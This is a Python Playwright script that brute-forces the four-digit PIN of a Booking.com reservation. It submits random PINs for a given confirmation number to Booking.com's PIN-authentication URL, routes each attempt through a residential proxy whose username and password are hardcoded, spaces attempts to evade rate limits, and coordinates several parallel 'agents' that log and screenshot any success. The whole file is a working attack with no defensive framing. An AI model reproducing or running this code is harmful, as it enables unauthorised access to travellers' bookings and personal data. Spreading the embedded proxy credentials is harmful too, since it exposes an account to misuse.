from playwright.sync_api import sync_playwright
import os
import time
import argparse
import random
import json
from datetime import datetime

# --- Configurable parameters ---
parser = argparse.ArgumentParser(description="Booking.com PIN tester")
parser.add_argument('--confirmation', type=str, default="6339614781", help='Confirmation number')
parser.add_argument('--agent', type=str, default="TEST", help='Agent name')
parser.add_argument('--wait', type=int, default=30, help='Wait time between attempts (seconds)')
parser.add_argument('--headless', action='store_true', help='Run browser in headless mode')
args = parser.parse_args()

CONFIRMATION = args.confirmation
WAIT_TIME = args.wait
HEADLESS = args.headless
AGENT_NAME = args.agent
SCREEN_DIR = "screenshots"

# Simple PIN generation
def generate_random_pins(count=10):
    """Generate random PINs"""
    pins = []
    for _ in range(count):
        pin = f"{random.randint(0, 9999):04d}"
        pins.append(pin)
    return pins

# Simple logging
def log_result(pin, result, url):
    """Log result to file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"{timestamp},{CONFIRMATION},{AGENT_NAME},{pin},{result},{url}\n"
    
    with open(f"simple_log_{CONFIRMATION}.txt", 'a', encoding='utf-8') as f:
        f.write(log_entry)
    
    print(f"[{timestamp}] Agent {AGENT_NAME} - PIN {pin}: {result}")
    
    # Check if success and save to JSON
    if result == 'SUCCESS':
        success_data = {
            'success_pin': pin,
            'agent': AGENT_NAME,
            'booking_id': CONFIRMATION,
            'timestamp': timestamp
        }
        with open(f"success_{CONFIRMATION}.json", 'w') as f:
            json.dump(success_data, f, indent=2)

# --- Proxy configuration ---
PROXY_CONFIG = {
    "server": "http://pr.oxylabs.io:7777",
    "username": "customer-Oxylab_WFqvh",
    "password": "Oxylab_WFqvh1"
}

os.makedirs(SCREEN_DIR, exist_ok=True)

# Check if success already found
if os.path.exists(f"success_{CONFIRMATION}.json"):
    with open(f"success_{CONFIRMATION}.json", 'r') as f:
        success_data = json.load(f)
    print(f"Success already found! PIN: {success_data['success_pin']} by agent {success_data['agent']}")
    exit(0)

PINS = generate_random_pins(10)
print(f"Agent {AGENT_NAME} will try these PINs: {PINS}")

def test_pin(pin):
    """Test a single PIN"""
    url = f"https://secure.booking.com/help/confirmation_pin_auth?confirmation={CONFIRMATION}&pin={pin}"
    
    with sync_playwright() as p:
        browser = p.chromium.launch(
            headless=HEADLESS,
            proxy=PROXY_CONFIG
        )
        
        try:
            page = browser.new_page()
            page.goto(url)
            time.sleep(3)
            
            # Check for success indicators
            success_indicators = [
                "confirmed",
                "success",
                "valid",
                "correct",
                "reservation details",
                "booking confirmed"
            ]
            
            page_content = page.content().lower()
            
            for indicator in success_indicators:
                if indicator in page_content:
                    # Take success screenshot
                    screenshot_path = os.path.join(SCREEN_DIR, f"{CONFIRMATION}_{pin}_success.png")
                    page.screenshot(path=screenshot_path)
                    log_result(pin, 'SUCCESS', url)
                    return True
            
            # Take failure screenshot
            screenshot_path = os.path.join(SCREEN_DIR, f"{CONFIRMATION}_{pin}_failed.png")
            page.screenshot(path=screenshot_path)
            log_result(pin, 'FAILED', url)
            return False
            
        except Exception as e:
            log_result(pin, f'ERROR: {str(e)}', url)
            return False
        finally:
            browser.close()

# Test all PINs
print(f"🚀 Agent {AGENT_NAME} starting mission for booking {CONFIRMATION}")
success_found = False

for i, pin in enumerate(PINS):
    if os.path.exists(f"success_{CONFIRMATION}.json"):
        print("Success found by another agent! Stopping.")
        break
    
    print(f"[{i+1}/{len(PINS)}] Testing PIN: {pin}")
    
    if test_pin(pin):
        print(f"🎉 SUCCESS! PIN {pin} works for booking {CONFIRMATION}")
        success_found = True
        break
    
    # Wait between attempts (except last one)
    if i < len(PINS) - 1:
        print(f"⏱️ Waiting {WAIT_TIME} seconds before next attempt...")
        time.sleep(WAIT_TIME)

if success_found:
    print(f"✅ Agent {AGENT_NAME} completed mission successfully!")
else:
    print(f"❌ Agent {AGENT_NAME} completed mission - no success found")
